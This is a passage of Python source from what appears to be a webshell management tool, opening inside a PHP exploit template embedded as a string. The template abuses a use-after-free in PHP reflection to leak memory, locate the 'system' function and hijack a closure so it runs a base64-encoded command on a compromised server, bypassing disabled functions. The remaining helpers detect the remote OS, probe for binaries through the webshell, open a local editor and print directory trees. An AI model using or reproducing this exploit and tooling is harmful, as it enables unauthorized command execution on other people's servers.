        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
        $name = explode("\\x00", $name)[0];
        if(in_array($name, $funcs)) {
        return [$name, bin2hex($prefix) . str_pad(dechex($addr), 8, "0", STR_PAD_LEFT),
        $std_object_handlers, $NumPrefix];
        }
        }
        }
        function getSystem($unknown_func) {
        $unknown_addr = hex2bin($unknown_func[1]);
        $prefix = substr($unknown_addr, 0, 4);
        $unknown_addr = hexdec($unknown_func[1]);
        $start = $unknown_addr & 0x00000000ffffffff;
        for($i = 0;$i < 0x800;$i++) {
        $addr = $start - 0x20 * $i;
        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
        "0", STR_PAD_LEFT))));
        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
        $unknown_func[3]) {
        continue;
        }
        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
        if(strstr($name, "system")) {
        return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
        "0", STR_PAD_LEFT))));
        }
        }
        for($i = 0;$i < 0x800;$i++) {
        $addr = $start + 0x20 * $i;
        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
        "0", STR_PAD_LEFT))));
        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
        $unknown_func[3]) {
        continue;
        }
        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
        if(strstr($name, "system")) {
        return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
        "0", STR_PAD_LEFT))));
        }
        }
        }
        $rp = new ReflectionProperty(Test::class, 'prop');
        $test = new Test;
        $test -> prop = new HelperHelperHelperHelperHelperHelperHelper;
        $abc = $rp -> getType() -> getName();
        $helper = new HelperHelperHelperHelperHelperHelperHelper();
        if (strlen($abc) < 1000) {
        exit("UAF Failed!");
        }
        $helper -> a = $helper;
        $php_heap = leak(0x10);
        $helper -> a = function($x){};
        $std_object_handlers = leak(0x0);
        $prefix = substr($php_heap, 0, 4);

        $closure_object = leak(0x10);

        write(0x28, "\\x06");
        if(!($unknown_func = get_basic_funcs($std_object_handlers))) {
        die("Couldn't determine funcs address");
        }
        //echo "Find func's adress: " . $unknown_func[1] . " -> " . $unknown_func[0] . "\\n";
        if(!($system_address = getSystem($unknown_func))) {
        die("Couldn't determine system address");
        }

        for ($i = 0;$i < (0x130 / 0x08);$i++) {
        write(0x308 + 0x08 * ($i + 1), leak2($prefix . s2b($closure_object, 0x08 *
        $i)));
        }
        $abc[0x308 + 0x40] = "\\x01";
        write(0x308 + 0x70, hex2bin($system_address));
        write(0x10, $prefix . hex2bin(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08)));

        ob_start();
        ($helper -> a)(base64_decode("%s"));
        $o=ob_get_contents();
        ob_end_clean();
%s""" % (base64_encode(command), print_command)
    elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
        return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
    else:
        return """print("No system execute function\\n");"""


def is_windows(remote: bool = True):
    if (remote):
        return gget("webshell.iswin", "webshell")
    else:
        if (not gget("iswin")):
            flag = True if 'win' in system().lower() else False
            gset("iswin", flag)
        else:
            flag = gget("iswin")
        return flag


def has_env(env: str, remote: bool = True):
    if (is_windows(remote)):
        command = "where"
    else:
        command = "which"
    if (remote):
        if (not gget("webshell.has_%s" % env, "webshell")):
            flag = send(get_system_code(f"{command} {env}")).r_text
            gset("webshell.has_%s" % env, flag, namespace="webshell")
        else:
            flag = gget("webshell.has_%s" % env, "webshell")
    else:
        if (not gget("has_%s" % env)):
            try:
                flag = check_output(
                    [command, env]).decode(LOCAL_ENCODING).strip()
            except Exception:
                flag = ''
            gset("has_%s" % env, flag)
        else:
            flag = gget("has_%s" % env)
    return len(flag)


def open_editor(file_path: str, editor: str = "", edit_args: str = ""):

    if (editor):
        if (has_env(editor, False)):
            binpath = gget(f"has_{editor}")
            if ("\n" in binpath):
                binpath = binpath.split("\n")[0].strip()
        else:
            print(color.red(f"{editor} not found in local environment"))
            return False
    else:
        binpath = "notepad.exe" if (is_windows(False)) else "vi"

    with open(file_path, "w+"):
        ...

    if editor.lower() in ["code", "vscode"] and not edit_args:
        edit_args = "--wait"

    edit_args = edit_args.split(" ")
    if edit_args[0]:
        command_args = [binpath] + edit_args + [file_path]
    else:
        command_args = [binpath, file_path]

    p = Popen(command_args, shell=True)
    p.wait()
    returncode = p.returncode
    return True if returncode == 0 else False


def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
    if (is_file):
        pipe = "└─" if (end) else "├─"
        connect_pipe = "".join([CONNECT_PIPE_MAP[_] for _ in LEVEL[:depth-1]])
        try:
            tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
        except Exception:
            pass
        if ("/" in tree_or_node):
            tree_or_node = tree_or_node.split("/")[-1]
        print(connect_pipe + pipe + tree_or_node)
    elif (isinstance(tree_or_node, list)):
        index = 0
        for v in tree_or_node:
            index += 1
            if (index == len(tree_or_node)):
                end = True
            _print_tree(v, depth+1, is_file=True, end=end)  # 输出目录
    elif (isinstance(tree_or_node, dict)):
        index = 0
        LEVEL.append(True)
        for k, v in tree_or_node.items():
            index += 1
            if (index == len(tree_or_node)):
                end = True
            if (isinstance(v, (list, dict))):  # 树中树
                _print_tree(k, depth+1, is_file=True, end=end)  # 输出目录
                if (end):
                    LEVEL[depth] = False
                _print_tree(v, depth+1)  # 递归输出树x
            elif (isinstance(v, str)) or v is None:  # 节点
                _print_tree(v, depth+1, is_file=True, end=end)  # 输出文件


def print_tree(name, tree):
    global LEVEL
    LEVEL = []
    print(name)
    _print_tree(tree)


def old_print_tree(origin_path: str, tree: dict, depth: int = 0):
    if depth:
        if not origin_path.isdigit() and tree:
            origin_path = color.blue(origin_path)
            if depth == 1:
                print("├──" + origin_path)
            else:
                print("│" + "  │" * (depth - 1) + "  " + "├─" + origin_path)
        else:
            depth -= 1

    else:
        print(origin_path)
    if isinstance(tree, dict):
        for k, v in tree.items():
            print_tree(k, v, depth + 1)
    if isinstance(tree, str):
        tree = [tree]
    if isinstance(tree, list):
        if not depth:
            new_tree = ["├─" + file.split("/")[-1] for file in tree]
            print("\n".join(new_tree))
        else:
            new_tree = [
                "│" + "  │" * (depth - 1) + "  " + "├─" + file.split("/")[-1]
                for file in tree
            ]
            print("\n".join(new_tree))
